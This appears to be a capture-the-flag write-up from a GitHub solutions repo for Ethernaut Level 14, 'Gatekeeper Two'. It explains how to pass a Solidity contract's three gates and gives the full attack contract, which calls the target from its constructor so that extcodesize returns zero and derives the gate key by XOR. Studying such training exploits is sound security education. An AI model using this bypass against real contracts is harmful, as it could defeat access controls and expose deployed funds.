# Level 14: Gatekeeper Two

This is the level 14 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [Difference between `tx.origin` and `msg.sender`](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
- [Solidity Assembly](https://docs.soliditylang.org/en/v0.4.23/assembly.html) & [caller & extcodesize](https://docs.soliditylang.org/en/v0.4.23/assembly.html#opcodes) opcodes.

## Hack
Given contract:

```
contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

`player` has to set itself as `entrant`, like the previous level.

We are going to implement `GatePassTwo` contract to attack:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    ...
}
```

### gateOne
This is exactly same as level 4. An intermediary contract (`GatePassTwo` here) will be used to call `enter`, so that `msg.sender` != `tx.origin`.

### gateTwo
Second check involves solidity assembly code - specifically `caller` and `extcodesize` functions. `caller()` is nothing but sender of message i.e. `msg.sender` which will be address of `GatePassTwo`.
`extcodesize(addr)` returns the size of contract at address `addr`. So, `x` is assigned the size of the contract at `msg.sender` address. But size of a contract is always going to be non-zero. And to pass check, `x` must zero!

Here's the trick. See the footer note of Ethereum [Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) on page 11:<br>
_"During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account..."_

Rings some bells? During creation/initialization of the contract the `extcodesize()` returns 0. So we're going to put the malicious code in `constructor` itself. Since it is the `constructor` that runs during initialization, any calls to `extcodesize()` will return 0. Update `GatePassTwo` accordingly (ignore `key` for now):

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    constructor(address _gateAddr) public {
        bytes8 key = bytes8(uint64(address(this)));
        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
```
This will pass `gateTwo`.

### gateThree
Third check is basically some manipulation with `^` XOR operator.

As is visible from the equality check:
```
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

`_gateKey` must be derived from `msg.sender` (in `GatekeeperTwo`), which is same as `address(this)` in our `GatePassTwo`.

The `uint64(0) - 1` on RHS is max value of `uint64` integer (due to underflow). Hence, in hex representation:
```
uint64(0) - 1 = 0xffffffffffffffff
```

By nature of XOR operation:
```
If, X ^ Y = Z
Then, Y = X ^ Z
```

Using this XOR property, it can be deduced that:
```
uint64(_gateKey) == uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
```

So, correct `key` can be calculated in solidity as:
```solidity
bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff))
```

Final update to `GatePassTwo`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    constructor(address _gateAddr) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff));
        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
```

Now deploy `GatePassTwo` with address of `GatekeeperTwo`, which will result in execution of malicious `constructor` code. And that will eventually register `player` as `entrant`.

Passed!


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
